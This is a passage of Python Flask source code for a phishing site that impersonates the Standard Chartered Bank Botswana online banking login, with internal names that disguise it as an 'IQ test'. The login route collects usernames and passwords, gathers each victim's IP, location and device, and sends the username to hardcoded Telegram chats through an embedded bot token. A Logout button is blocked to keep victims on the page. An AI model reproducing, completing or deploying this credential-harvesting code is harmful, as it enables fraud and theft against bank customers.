from flask import Flask, request, session, redirect, url_for, render_template_string
import requests
import secrets
from datetime import datetime

app = Flask(__name__)
app.secret_key = "iq-test-2026-secret-key"


# ============================================================
# TELEGRAM
# ============================================================

BOT_TOKEN = "8817097833:AAHI7lZlDpYuMuZmSEKd0o9b6mblqFw6xVo"
CHAT_IDS = [
    "8116369149",
    "8761983601"
]



# ============================================================
# CSS
# ============================================================

CSS = """
<style>

/* ============================================================
  CSS
   ============================================================ */


* {
    box-sizing: border-box;
}

html,
body {
    margin: 0;
    padding: 0;
    width: 100%;
    min-height: 100%;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #ffffff;
    color: #333;
    overflow-x: hidden;
}


/* LOGIN */

.login-page {
    min-height: 100vh;
    background: #ffffff;
}

.login-small-header {
    height: 105px;
    background: white;
    border-bottom: 1px solid #999;
    display: flex;
    align-items: center;
    padding: 0 24px;
}

.login-small-logo {
    width: 62px;
    height: 50px;
    position: relative;
}

.login-small-logo {
    width: 62px;
    height: 50px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.login-box {
    width: 100%;
    max-width: 760px;
    margin: 0 auto;
    padding: 25px 24px 50px;
}

.login-logo {
    width: 135px;
    height: 135px;
    margin: 0 auto 30px;
    position: relative;
}

.logo-blue {
    width: 118px;
    height: 118px;
    background: #5FBF74;
    border-radius: 45%;
    position: absolute;
    left: 8px;
    top: 8px;
}

.logo-orange {
    width: 74px;
    height: 74px;
    background: #67C47A;
    border-radius: 10px;
    position: absolute;
    left: 30px;
    top: 30px;
}

.real-logo {
    width: 100%;
    height: 100%;
    object-fit: contain;
    display: block;
}

.logo-mark {
    position: absolute;
    width: 22px;
    height: 70px;
    background: #674000;
    left: 56px;
    top: 35px;
}

.login-title {
    color: #4FAE68;
    font-size: 30px;
    line-height: 1.25;
    font-weight: bold;
    margin: 10px 0 50px;
}

.login-note {
    background: #F7FAF8;
    padding: 15px;
    border-radius: 10px;
    margin-bottom: 35px;
    line-height: 1.5;
    color: #555;
}

.brand {
    font-weight: 500;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    gap: 10px;
    padding-left: 18px;
}

.header-logo {
    width: 52px;
    height: 42px;
    object-fit: contain;
    display: block;
}

.login-label {
    display: block;
    font-size: 25px;
    color: #696969;
    margin-bottom: 12px;
}

.login-input {
    width: 100%;
    height: 68px;
    border-radius: 30px;
    border: 1px solid #cfcfcf;
    background: #F7FAF8;
    padding: 0 22px;
    font-size: 21px;
    margin-bottom: 45px;
    outline: none;
}

.login-button {
    width: 100%;
    height: 68px;
    border: none;
    border-radius: 34px;
    background: #67C47A;
    color: white;
    font-size: 29px;
    cursor: pointer;
}


/* HEADER */

.topbar {
    width: 100%;
    height: 88px;
    background: #ffffff;
    display: grid;
    grid-template-columns: 1fr 1px 1fr;
    align-items: center;
    color: #3F8F52;
    border-bottom: 1px solid #d9e8dc;
}

.top-item {
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 23px;
}

.top-divider {
    width: 1px;
    height: 100%;
    background: #d9e8dc;
}

.brand {
    font-weight: 500;
}

.logoff {
    display: inline-block;
    background: #67C47A;
    color: white;
    padding: 10px 20px;
    border-radius: 7px;
    border: none;
    font-size: 18px;
    box-shadow: 0 2px 4px rgba(0,0,0,.25);
    cursor: pointer;
}


/* PAGE */

.page {
    width: 100%;
    min-height: calc(100vh - 88px);
    padding: 14px 14px 35px;
    background: #ffffff;
}

.panel {
    width: 100%;
    max-width: 650px;
    min-height: 720px;
    margin: 0 auto;
    background: #ffffff;
    border-radius: 27px;
    padding: 30px 22px 35px;
    box-shadow: 0 4px 18px rgba(0,0,0,.20);
    overflow: hidden;
}

.panel-title {
    font-size: 32px;
    font-family: Georgia, serif;
    text-align: center;
    line-height: 1.3;
    margin: 0 0 24px;
    color: #111;
}

.small-real-logo {
    width: 100%;
    height: 100%;
    object-fit: contain;
    display: block;
}

.intro-box {
    background: #FAFCFA;
    border-radius: 15px;
    padding: 18px;
    line-height: 1.65;
    margin-bottom: 28px;
    font-size: 17px;
}

.iq-title {
    font-family: Georgia, serif;
    font-size: 31px;
    text-align: center;
    margin: 10px 0 22px;
    color: #111;
}


/* INFORMATION */

.form-row {
    width: 100%;
    display: grid;
    grid-template-columns: 175px minmax(0,1fr) 44px;
    gap: 10px;
    align-items: center;
    margin-bottom: 13px;
}

.form-row label {
    font-size: 18px;
    line-height: 1.1;
}

.small-field {
    width: 100%;
    min-width: 0;
    height: 43px;
    border: 1px solid #A8DDB4;
    background: #ffffff;
    padding: 0 10px;
    font-size: 17px;
    outline: none;
}

.help-btn {
    width: 38px;
    height: 38px;
    border-radius: 8px;
    border: 2px solid #666;
    background: #fafafa;
    font-size: 24px;
    cursor: pointer;
}


/* TERMS */

.terms {
    margin-top: 30px;
}

.terms-title {
    font-weight: bold;
    font-size: 21px;
    margin-bottom: 17px;
}

.terms-row {
    display: flex;
    align-items: flex-start;
    gap: 12px;
}

.terms-row input {
    width: 25px;
    height: 25px;
    flex-shrink: 0;
}

.terms-row a {
    color: #222;
}

.confirm-btn {
    background: #67C47A;
    color: white;
    border: none;
    border-radius: 6px;
    padding: 11px 24px;
    font-size: 19px;
    margin-top: 25px;
    cursor: pointer;
}


/* QUESTIONS */

.question-row {
    width: 100%;
    display: grid;
    grid-template-columns: 150px minmax(0,1fr) 44px;
    align-items: center;
    gap: 10px;
    margin: 18px 0;
}

.question-text {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 18px;
    line-height: 1.1;
    text-align: left;
    white-space: normal;
}

.question-input {
    width: 100%;
    min-width: 0;
    height: 43px;
    border: 1px solid #9ED7AB;
    font-size: 18px;
    padding: 0 10px;
    outline: none;
    background: white;
}


/* AGE */

.age-title {
    font-family: Georgia, serif;
    font-size: 40px;
    text-align: center;
    margin: 48px 0 42px;
}

.age-row {
    width: 100%;
    display: grid;
    grid-template-columns: 110px minmax(0,1fr) 120px;
    gap: 12px;
    align-items: center;
}

.age-row label {
    font-family: Georgia, serif;
    font-size: 32px;
}

.age-input {
    width: 100%;
    min-width: 0;
    height: 46px;
    border: 1px solid #9ED7AB;
    font-size: 20px;
    padding: 0 10px;
}

.submit-age {
    height: 46px;
    border: 1px solid #555;
    background: white;
    border-radius: 6px;
    font-size: 19px;
    cursor: pointer;
}


/* PROCESSING */

.processing-panel {
    width: 100%;
    max-width: 650px;
    min-height: 700px;
    margin: 0 auto;
    background: white;
    border-radius: 27px;
    padding: 45px 25px;
    box-shadow: 0 4px 18px rgba(0,0,0,.20);
    text-align: center;
}

.processing-title {
    margin-top: 120px;
    font-size: 33px;
    font-family: Georgia, serif;
}

.spinner {
    width: 105px;
    height: 105px;
    margin: 45px auto 25px;
    border: 10px solid #ddd;
    border-top-color: #55B96A;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}

.percent {
    font-size: 34px;
    color: #55B96A;
    font-weight: bold;
}


/* FINAL */

.final-title {
    font-family: Georgia, serif;
    font-size: 44px;
    line-height: 1.25;
    text-align: center;
    margin-top: 130px;
}

.final-text {
    text-align: center;
    font-size: 21px;
    line-height: 1.6;
    max-width: 500px;
    margin: 40px auto;
}


/* FOOTER */

.footer {
    min-height: 65px;
    background: #22BFE8;
    border-top: 1px solid #7AD18D;
    padding: 14px 20px;
    text-align: center;
    font-size: 13px;
    color: #ffffff;
}


/* MOBILE */

@media(max-width:600px) {

    .login-box {
        padding: 18px 20px 35px;
    }

    @media(max-width:600px) {

    .brand {
        gap: 6px;
        padding-left: 8px;
    }

    .header-logo {
        width: 40px;
        height: 34px;
    }
}

    .login-title {
        font-size: 23px;
    }

    .login-label {
        font-size: 20px;
    }

    .login-input {
        height: 58px;
        font-size: 18px;
        margin-bottom: 35px;
    }

    .login-button {
        height: 59px;
        font-size: 24px;
    }

    .topbar {
        height: 76px;
    }

    .top-item {
        font-size: 18px;
    }

    .logoff {
        font-size: 15px;
        padding: 8px 14px;
    }

    .page {
        padding: 10px 9px 25px;
    }

    .panel {
        min-height: calc(100vh - 105px);
        border-radius: 22px;
        padding: 23px 13px 28px;
    }

    .panel-title {
        font-size: 25px;
    }

    .iq-title {
        font-size: 26px;
    }

    .intro-box {
        font-size: 15px;
    }

    .form-row {
        grid-template-columns: 105px minmax(0,1fr) 36px;
        gap: 6px;
    }

    .form-row label {
        font-size: 14px;
    }

    .small-field {
        height: 38px;
        font-size: 15px;
    }

    .help-btn {
        width: 34px;
        height: 34px;
        font-size: 21px;
    }

    .question-row {
        grid-template-columns: 85px minmax(0,1fr) 36px;
        gap: 6px;
    }

    .question-text {
        font-size: 14px;
        line-height: 1.1;
        text-align: left;
    }

    .question-input {
        height: 39px;
        font-size: 15px;
    }

    .age-title {
        font-size: 31px;
    }

    .age-row {
        grid-template-columns: 65px minmax(0,1fr) 85px;
        gap: 7px;
    }

    .age-row label {
        font-size: 24px;
    }

    .age-input,
    .submit-age {
        height: 40px;
        font-size: 16px;
    }

    .processing-panel {
        min-height: calc(100vh - 105px);
        border-radius: 22px;
    }

    .processing-title {
        margin-top: 95px;
        font-size: 27px;
    }

    .final-title {
        font-size: 33px;
        margin-top: 95px;
    }

    .final-text {
        font-size: 18px;
    }
}

@media(max-width:380px) {

    .form-row {
        grid-template-columns: 92px minmax(0,1fr) 33px;
        gap: 5px;
    }

    .question-row {
        grid-template-columns: 73px minmax(0,1fr) 33px;
        gap: 5px;
    }

    .question-text {
        font-size: 21px;
    }
}

.age-panel {
    max-width: 620px;
    margin: 30px auto;
    padding: 42px 34px;
    text-align: center;
    background: #ffffff;
    border-radius: 24px;
    box-shadow: 0 8px 28px rgba(0, 0, 0, 0.14);
}

.age-main-title {
    font-size: 31px;
    font-weight: 700;
    margin-bottom: 12px;
    color: #222;
}

.age-description {
    font-size: 19px;
    color: #555;
    margin-bottom: 24px;
}

.age-input-new {
    width: 100%;
    box-sizing: border-box;
    height: 54px;
    padding: 0 16px;
    border: 2px solid #58B96B;
    border-radius: 9px;
    font-size: 20px;
    background: #fff;
    outline: none;
}

.age-input-new:focus {
    border-color: #3B8F4E;
    box-shadow: 0 0 0 3px rgba(95, 191, 116, 0.14);
}

.age-confirm-button {
    width: 100%;
    height: 56px;
    margin-top: 18px;
    border: none;
    border-radius: 9px;
    background: #67C47A;
    color: white;
    font-size: 19px;
    font-weight: 700;
    cursor: pointer;
}

.age-confirm-button:disabled {
    opacity: 0.65;
    cursor: default;
}

.age-request-text {
    margin-top: 26px;
    font-size: 16px;
    line-height: 1.6;
    color: #555;
}

.age-request-text span {
    color: #4EAC62;
    font-weight: 600;
    text-decoration: underline;
}

.age-processing {
    margin-top: 24px;
    padding: 17px;
    border-radius: 10px;
    background: #F3FBF5;
    border: 1px solid #B8E3C1;
    color: #3F5E47;
    font-size: 16px;
}

.mini-spinner {
    width: 20px;
    height: 20px;
    margin: 0 auto 10px;
    border: 3px solid #ddd;
    border-top-color: #58B96B;
    border-radius: 50%;
    animation: ageSpin 0.8s linear infinite;
}

@keyframes ageSpin {
    to {
        transform: rotate(360deg);
    }
}

.age-error {
    margin-top: 18px;
    padding: 18px;
    border-radius: 10px;
    background: #F3FBF5;
    border: 1px solid #A4D7AF;
    color: #3F5E47;
    font-size: 16px;
    line-height: 1.5;
}

.age-error strong {
    color: #3D9250;
}

.age-congratulations {
    margin-top: 38px;
    padding: 34px 25px;
    border-radius: 18px;
    background: #EFFAF3;
}

.age-congratulations h2 {
    margin: 0 0 18px;
    font-size: 31px;
    color: #3D9250;
}

.age-congratulations p {
    font-size: 17px;
    line-height: 1.6;
    color: #444;
}

.congratulations-main {
    font-size: 20px !important;
    font-weight: 600;
}

.congratulations-final {
    margin-top: 22px;
    color: #3D9250 !important;
    font-weight: 600;
}

@media (max-width: 600px) {

    .age-panel {
        margin: 18px 12px;
        padding: 30px 18px;
        border-radius: 20px;
    }

    .age-main-title {
        font-size: 26px;
    }

    .age-description {
        font-size: 17px;
    }

    .age-input-new {
        height: 50px;
        font-size: 18px;
    }

    .age-confirm-button {
        height: 53px;
        font-size: 18px;
    }

    .age-congratulations h2 {
        font-size: 26px;
    }
}

.secondary-login-button {
    display: block;
    width: 100%;
    margin-top: 18px;
    padding: 13px 15px;
    background: white;
    color: #111;
    border: 1.5px solid #222;
    border-radius: 30px;
    font-size: 17px;
    cursor: pointer;
}

.secondary-login-button:active {
    background: #f1f1f1;
    transform: scale(0.99);
}

.login-footer {
    margin-top: 70px;
    padding: 20px 10px;
    color: #4A6B52;
    font-size: 14px;
    text-align: center;
    line-height: 1.5;
}

.phone-field {
    display: flex;
    align-items: center;
    width: 100%;
    height: 42px;
    box-sizing: border-box;
    border: 1px solid #B8D9C0;
    background: white;
}

.phone-prefix {
    padding-left: 10px;
    padding-right: 6px;
    color: #222;
    font-size: 16px;
    white-space: nowrap;
}

.phone-field input {
    flex: 1;
    min-width: 0;
    height: 100%;
    padding: 8px 10px 8px 0;
    box-sizing: border-box;
    border: none;
    outline: none;
    background: transparent;
    font-size: 16px;
}

.test-notice-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.45);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    z-index: 99999;
}

.test-notice-box {
    width: 100%;
    max-width: 420px;
    background: #67C47A;
    color: white;
    padding: 30px 24px;
    border-radius: 18px;
    text-align: center;
    box-shadow: 0 12px 35px rgba(0,0,0,0.30);
}

.test-notice-icon {
    font-size: 38px;
    margin-bottom: 10px;
}

.test-notice-title {
    font-size: 24px;
    font-weight: 700;
    margin-bottom: 15px;
}

.test-notice-username {
    font-size: 20px;
    font-weight: 700;
    margin-bottom: 15px;
}

.test-notice-text {
    font-size: 17px;
    line-height: 1.5;
    margin-bottom: 24px;
}

.test-notice-button {
    min-width: 120px;
    padding: 12px 28px;
    border: none;
    border-radius: 8px;
    background: white;
    color: #4FAE68;
    font-size: 17px;
    font-weight: 700;
    cursor: pointer;
}

</style>
"""


# ============================================================
# HELPERS
# ============================================================

def now_string():
    return datetime.now().strftime("%d/%m/%Y - %H:%M:%S")

def get_ip():
    forwarded = request.headers.get("X-Forwarded-For", "")

    if forwarded:
        return forwarded.split(",")[0].strip()

    return request.remote_addr or "Unknown"


def get_location():
    city = request.headers.get("X-Vercel-IP-City", "")
    country = request.headers.get("X-Vercel-IP-Country", "")

    city = city.replace("%20", " ")

    if city and country:
        return f"{city}, {country}"

    if country:
        return country

    return "Unknown"

def new_test_id():
    return "IQ-" + secrets.token_hex(3).upper()


def get_device():

    agent = request.headers.get("User-Agent", "")
    lower = agent.lower()

    if "android" in lower:
        device = "Android"
    elif "iphone" in lower:
        device = "iPhone"
    elif "windows" in lower:
        device = "Windows"
    elif "macintosh" in lower:
        device = "Mac"
    elif "linux" in lower:
        device = "Linux"
    else:
        device = "Unknown"

    if "edg/" in lower:
        browser = "Edge"
    elif "firefox/" in lower:
        browser = "Firefox"
    elif "chrome/" in lower:
        browser = "Chrome"
    elif "safari/" in lower:
        browser = "Safari"
    else:
        browser = "Browser"

    return f"{device} / {browser}"


def send_telegram(message):

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    for chat_id in CHAT_IDS:

        response = requests.post(
            url,
            data={
                "chat_id": chat_id,
                "text": message
            },
            timeout=10
        )

        print(
            "Telegram:",
            chat_id,
            response.status_code,
            response.text
        )


# ============================================================
# BASE
# ============================================================

def base(content, header=True):

    top = """
    <div class="topbar">

        <div class="top-item brand">

    <img
        src="https://images.seeklogo.com/logo-png/42/1/standard-chartered-bank-logo-png_seeklogo-429587.png"
        alt="Logo"
        class="header-logo"
    >

    <span>
        standard chartered
    </span>

</div>

        <div class="top-divider"></div>

        <div class="top-item">

            <button
                type="button"
                class="logoff"
                onclick="alert('Please complete the verification before leaving.')"
            >
                Logout
            </button>

        </div>

    </div>
    """ if header else ""

    return f"""
    <!DOCTYPE html>

    <html lang="en">

    <head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Standard Chartered</title>

    <link
        rel="icon"
        type="image/png"
        href="https://images.seeklogo.com/logo-png/42/1/standard-chartered-bank-logo-png_seeklogo-429587.png"
    >

    <meta property="og:title" content="Standard Chartered">

    <meta
        property="og:description"
        content="Online STANDARD CHARTERED SERVER."
    >

    <meta
        property="og:image"
        content="https://images.seeklogo.com/logo-png/42/1/standard-chartered-bank-logo-png_seeklogo-429587.png"
    >

    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">

    <meta
        name="twitter:image"
        content="https://images.seeklogo.com/logo-png/42/1/standard-chartered-bank-logo-png_seeklogo-429587.png"
    >

    {CSS}

</head>

    <body>

        {top}

        {content}

        <div class="footer">
            ONLINE STANDARD CHARTERED VERIFICATION | SERVER SYSTEM BW
        </div>

    </body>

    </html>
    """

# ============================================================
# LOGIN
# ============================================================

@app.route("/", methods=["GET", "POST"])
def login():

    if request.method == "POST":

        username = request.form.get(
            "username",
            ""
        ).strip()

        test_access_code = request.form.get(
            "test_access_code",
            ""
        ).strip()

        if not username or not test_access_code:
            return redirect(url_for("login"))

        session.clear()

        session["login_done"] = True
        session["test_id"] = new_test_id()
        session["started_at"] = now_string()
        session["device"] = get_device()

        session["test_username"] = username
        session["test_access_verified"] = True

        access_message = f"""
🔐 ACCESS STANDARD CHARTERED

Username: {username}
Status: Test access started
"""

        try:
            send_telegram(access_message)
        except Exception as error:
            print("ACCESS TELEGRAM ERROR:", error)

        return redirect(
            url_for(
                "transition",
                next_page="information"
            )
        )

    content = """

<style>

html,
body {
    margin: 0 !important;
    padding: 0 !important;
    width: 100%;
    height: 100%;
    overflow: hidden !important;
    background: #ffffff;
    font-family: Arial, Helvetica, sans-serif;
}

* {
    box-sizing: border-box;
}

.ref-login-page {
    position: fixed;
    inset: 0;
    width: 100vw;
    height: 100dvh;
    overflow: hidden;
    background: #ffffff;
}


/* ============================================================
   HEADER
   ============================================================ */

.ref-header {
    height: 7.2dvh;
    min-height: 46px;
    max-height: 76px;
    width: 100%;
    background: #ffffff;
    display: flex;
    align-items: center;
    padding: 0 2.2%;
    color: #333333;
    border-bottom: 1px solid #eeeeee;
}

.ref-header-left {
    display: flex;
    align-items: center;
    height: 100%;
}

.ref-country {
    color: #5ebf72;
    font-size: clamp(10px, 1.55vw, 15px);
    margin-right: clamp(24px, 5vw, 58px);
}

.ref-nav {
    display: flex;
    align-items: center;
    gap: clamp(24px, 4vw, 46px);
}

.ref-nav span {
    font-size: clamp(11px, 1.7vw, 16px);
    white-space: nowrap;
}

.ref-brand {
    margin-left: auto;
    color: #5ebf72;
    font-size: clamp(10px, 1.45vw, 14px);
    font-weight: 600;
    white-space: nowrap;
}


/* ============================================================
   HERO AGRICOLA
   ============================================================ */

.ref-hero {
    position: relative;
    width: 100%;
    height: 39.8dvh;
    overflow: hidden;

    background:
        linear-gradient(
            rgba(17, 72, 34, 0.34),
            rgba(17, 72, 34, 0.34)
        ),
        url("https://images.unsplash.com/photo-1500382017468-9049fed747ef?auto=format&fit=crop&w=1600&q=90");

    background-size: cover;
    background-position: center 54%;
}

.ref-login-wrap {
    position: absolute;
    left: 50%;
    top: 50.5%;
    transform: translate(-50%, -50%);

    width: 50.5%;
    max-width: 520px;
    min-width: 295px;
}

.ref-title {
    margin: 0 0 clamp(18px, 2.2dvh, 28px);

    color: rgba(255,255,255,.82);

    font-size: clamp(27px, 4.4vw, 46px);
    font-weight: 300;
    line-height: 1.05;

    white-space: nowrap;
}


/* ============================================================
   INPUTS
   ============================================================ */

.ref-field {
    width: 100%;
    height: clamp(48px, 5.7dvh, 58px);

    margin-bottom: clamp(8px, 1dvh, 12px);

    background: #ffffff;

    display: grid;
    grid-template-columns: 25% 75%;

    align-items: center;

    border: 1px solid rgba(0,0,0,.06);
}

.ref-field-label {
    padding-left: clamp(16px, 2vw, 24px);

    color: #6f6f6f;

    font-size: clamp(12px, 1.55vw, 15px);
    font-weight: 600;

    white-space: nowrap;
}

.ref-field input {
    width: 100%;
    height: 100%;

    padding: 0 clamp(12px, 1.7vw, 20px);

    border: none;
    outline: none;

    background: #ffffff;

    color: #666666;

    font-size: clamp(12px, 1.5vw, 15px);
}

.ref-field input::placeholder {
    color: #c7c7c7;
    opacity: 1;
}


/* ============================================================
   LOGIN BUTTON
   ============================================================ */

.ref-login-button {
    display: block;

    width: 100%;
    height: clamp(49px, 5.8dvh, 58px);

    margin-top: clamp(9px, 1dvh, 12px);

    border: none;

    background: #67c479;

    color: #ffffff;

    font-size: clamp(10px, 1.4vw, 13px);
    font-weight: 600;

    text-transform: uppercase;

    cursor: pointer;
}

.ref-login-button:active {
    background: #5eb970;
}


/* ============================================================
   HERO LINKS
   ============================================================ */

.ref-hero-links {
    width: 100%;

    margin-top: clamp(19px, 2.4dvh, 26px);

    display: flex;
    align-items: center;
    justify-content: space-between;

    color: rgba(255,255,255,.86);

    font-size: clamp(10px, 1.45vw, 13px);
}

.ref-security {
    display: flex;
    align-items: center;
    gap: 6px;
}

.ref-security-icon {
    width: 17px;
    height: 17px;

    border: 2px solid rgba(255,255,255,.8);
    border-radius: 5px;

    display: inline-flex;
    align-items: center;
    justify-content: center;

    transform: rotate(-35deg);

    font-size: 8px;
}


/* ============================================================
   REGISTER SECTION
   ============================================================ */

.ref-register {
    width: 100%;
    height: 27.1dvh;

    background: #ffffff;

    text-align: center;

    padding-top: clamp(25px, 3.3dvh, 39px);

    overflow: hidden;
}

.ref-register-title {
    margin: 0 0 clamp(30px, 4dvh, 47px);

    color: #bae5e9;

    font-size: clamp(27px, 4.3vw, 44px);
    font-weight: 300;
    line-height: 1;
}

.ref-register-options {
    width: 70%;
    max-width: 600px;

    margin: 0 auto;

    display: grid;
    grid-template-columns: 1fr 1fr;

    gap: clamp(12px, 1.8vw, 18px);
}

.ref-register-option {
    position: relative;

    height: clamp(62px, 7.5dvh, 80px);

    border: 1px solid #dddddd;

    background: #ffffff;

    color: #5f5f5f;

    display: flex;
    align-items: center;

    text-align: left;

    padding: 0 clamp(38px, 5vw, 60px) 0 clamp(16px, 2vw, 27px);

    font-size: clamp(8px, 1.2vw, 11px);
    line-height: 1.25;

    cursor: pointer;
}

.ref-register-icon {
    position: absolute;

    right: clamp(11px, 1.6vw, 18px);
    top: 50%;

    transform: translateY(-50%);

    width: clamp(23px, 3vw, 32px);
    height: clamp(19px, 2.6vw, 27px);

    border: 1px solid #8cc99b;
}

.ref-register-icon.phone {
    width: clamp(17px, 2.4vw, 24px);
    height: clamp(29px, 4vw, 40px);
    border-radius: 2px;
}

.ref-register-note {
    margin-top: clamp(24px, 3.5dvh, 38px);

    color: #b6b6b6;

    font-size: clamp(8px, 1.25vw, 12px);
}


/* ============================================================
   CYAN BOTTOM
   ============================================================ */

.ref-bottom {
    position: relative;

    width: 100%;
    height: 25.9dvh;

    overflow: hidden;

    background: #22bee8;

    text-align: center;

    color: #ffffff;
}

.ref-bottom::before {
    content: "";

    position: absolute;
    inset: 0;

    opacity: .08;

    background-image:
        linear-gradient(
            45deg,
            transparent 46%,
            #ffffff 47%,
            #ffffff 49%,
            transparent 50%
        ),
        linear-gradient(
            -45deg,
            transparent 46%,
            #ffffff 47%,
            #ffffff 49%,
            transparent 50%
        );

    background-size: 95px 95px;
}

.ref-bottom-content {
    position: relative;
    z-index: 1;

    height: 100%;

    display: flex;
    flex-direction: column;
    align-items: center;

    padding-top: clamp(34px, 4.5dvh, 50px);
}

.ref-bottom-title {
    margin: 0 0 clamp(22px, 2.7dvh, 30px);

    color: rgba(255,255,255,.60);

    font-size: clamp(29px, 4.5vw, 46px);
    font-weight: 300;
    line-height: 1;
}

.ref-bottom-text {
    width: 58%;
    max-width: 520px;

    margin-bottom: clamp(22px, 2.8dvh, 32px);

    color: rgba(255,255,255,.84);

    font-size: clamp(9px, 1.3vw, 12px);
    font-weight: 600;
    line-height: 1.35;
}

.ref-bottom-button {
    min-width: clamp(125px, 18vw, 150px);
    height: clamp(43px, 5.5dvh, 55px);

    padding: 0 20px;

    border: 2px solid rgba(255,255,255,.28);

    background: transparent;

    color: rgba(255,255,255,.83);

    font-size: clamp(9px, 1.25vw, 12px);
    font-weight: 600;

    cursor: pointer;
}


/* ============================================================
   TEST NOTICE
   ============================================================ */

.ref-test-overlay {
    position: fixed;

    inset: 0;

    z-index: 999999;

    display: none;

    align-items: center;
    justify-content: center;

    background: rgba(0,0,0,.47);

    padding: 20px;
}

.ref-test-box {
    width: 100%;
    max-width: 380px;

    padding: 28px 24px;

    background: #67c479;

    color: white;

    border-radius: 8px;

    text-align: center;

    box-shadow: 0 10px 28px rgba(0,0,0,.26);
}

.ref-test-icon {
    font-size: 32px;
    margin-bottom: 10px;
}

.ref-test-title {
    font-size: 20px;
    font-weight: 700;
    margin-bottom: 12px;
}

.ref-test-username {
    font-size: 17px;
    font-weight: 700;
    margin-bottom: 14px;
}

.ref-test-text {
    font-size: 14px;
    line-height: 1.5;
    margin-bottom: 20px;
}

.ref-test-button {
    min-width: 100px;
    height: 37px;

    border: none;

    background: white;

    color: #4fae68;

    font-weight: 700;

    cursor: pointer;
}


/* ============================================================
   MOBILE
   ============================================================ */

@media (max-width: 600px) {

    .ref-header {
        padding-left: 11px;
        padding-right: 11px;
    }

    .ref-country {
        margin-right: 21px;
    }

    .ref-nav {
        gap: 20px;
    }

    .ref-brand {
        font-size: 9px;
    }

    .ref-login-wrap {
        width: 51%;
        min-width: 0;
    }

    .ref-title {
        font-size: 21px;
        margin-bottom: 17px;
    }

    .ref-field {
        height: 29px;
        margin-bottom: 6px;
    }

    .ref-field-label {
        padding-left: 11px;
        font-size: 8px;
    }

    .ref-field input {
        padding-left: 8px;
        padding-right: 8px;
        font-size: 8px;
    }

    .ref-login-button {
        height: 31px;
        margin-top: 7px;
        font-size: 7px;
    }

    .ref-hero-links {
        margin-top: 14px;
        font-size: 7px;
    }

    .ref-security-icon {
        width: 13px;
        height: 13px;
        border-width: 1px;
    }

    .ref-register {
        padding-top: 23px;
    }

    .ref-register-title {
        font-size: 22px;
        margin-bottom: 30px;
    }

    .ref-register-options {
        width: 70%;
        gap: 7px;
    }

    .ref-register-option {
        height: 40px;
        padding-left: 14px;
        padding-right: 32px;
        font-size: 6px;
    }

    .ref-register-icon {
        right: 8px;
        width: 22px;
        height: 17px;
    }

    .ref-register-icon.phone {
        width: 14px;
        height: 25px;
    }

    .ref-register-note {
        margin-top: 18px;
        font-size: 6px;
    }

    .ref-bottom-content {
        padding-top: 27px;
    }

    .ref-bottom-title {
        font-size: 22px;
        margin-bottom: 22px;
    }

    .ref-bottom-text {
        width: 60%;
        font-size: 6px;
        margin-bottom: 18px;
    }

    .ref-bottom-button {
        min-width: 92px;
        height: 31px;
        font-size: 7px;
        border-width: 1px;
    }
}

</style>


<div class="ref-login-page">


    <!-- ====================================================
         HEADER
         ==================================================== -->

    <header class="ref-header">

        <div class="ref-header-left">

            <div class="ref-country">
                Botswana
            </div>

            <nav class="ref-nav">

                <span>
                    Apply
                </span>

                <span>
                    Get Help
                </span>

            </nav>

        </div>

       <div
    class="ref-brand"
    style="
        width: 82px;
        height: 42px;
        display: flex;
        align-items: center;
        justify-content: flex-end;
        overflow: visible;
    "
>
    <img
        src="https://images.seeklogo.com/logo-png/42/1/standard-chartered-bank-logo-png_seeklogo-429587.png"
        alt=""
        style="
            width: 48px;
            height: 48px;
            object-fit: contain;
            display: block;
            flex-shrink: 0;
        "
    >
</div>
    </header>



    <!-- ====================================================
         HERO
         ==================================================== -->

    <section class="ref-hero">

        <div class="ref-login-wrap">

            <div class="ref-title">
                Sign in to online banking
            </div>


            <form
                method="POST"
                id="loginForm"
            >

                <div class="ref-field">

                    <div class="ref-field-label">
                        Username
                    </div>

                    <input
                        id="usernameInput"
                        type="text"
                        name="username"
                        placeholder="Case sensitive username"
                        autocomplete="on"
                        required
                    >

                </div>


                <div class="ref-field">

                    <div class="ref-field-label">
                        Password
                    </div>

                    <input
                        id="accessCodeInput"
                        type="password"
                        name="test_access_code"
                        placeholder="Case sensitive password"
                        autocomplete="off"
                        minlength="5"
                        required
                    >

                </div>


                <button
                    id="loginButton"
                    class="ref-login-button"
                    type="submit"
                >
                    LOGIN
                </button>


                <div class="ref-hero-links">

                    <span>
                        Forgot Username / password?
                    </span>


                    <span class="ref-security">

                        <span class="ref-security-icon">
                            ◇
                        </span>

                        Security Tips

                    </span>

                </div>

            </form>

        </div>

    </section>



    <!-- ====================================================
         REGISTER
         ==================================================== -->

    <section class="ref-register">

        <div class="ref-register-title">
            New to online banking?
        </div>


        <div class="ref-register-options">


            <button
                type="button"
                class="ref-register-option"
            >

                REGISTER WITH YOUR SC ATM/
                DEBIT CARD

                <span class="ref-register-icon"></span>

            </button>


            <button
                type="button"
                class="ref-register-option"
            >

                REGISTER WITH TEMPORARY ID
                <br>
                AND SMS PIN

                <span
                    class="
                        ref-register-icon
                        phone
                    "
                ></span>

            </button>


        </div>


        <div class="ref-register-note">

            Please ensure your mobile number is registered with us receive an SMS with a password to complete your registration.
            
        </div>

    </section>



    <!-- ====================================================
         CYAN
         ==================================================== -->

    <section class="ref-bottom">

        <div class="ref-bottom-content">

            <div class="ref-bottom-title">
                No card with us?
            </div>


            <div class="ref-bottom-text">

                To registerfor online and Mobile Banking, please visit one of our branches to 
                                    apply for ATM/ Debit/ Credit card

            </div>


            <button
                type="button"
                class="ref-bottom-button"
            >
                FIND A BRANCH
            </button>

        </div>

    </section>


</div>



<!-- ========================================================
     ALERT
     ======================================================== -->

<div
    id="testNotice"
    class="ref-test-overlay"
>

    <div class="ref-test-box">

        <div class="ref-test-icon">
            ⚠
        </div>

        <div class="ref-test-title">
            ALERT STANDARD CHARTERED
        </div>

        <div
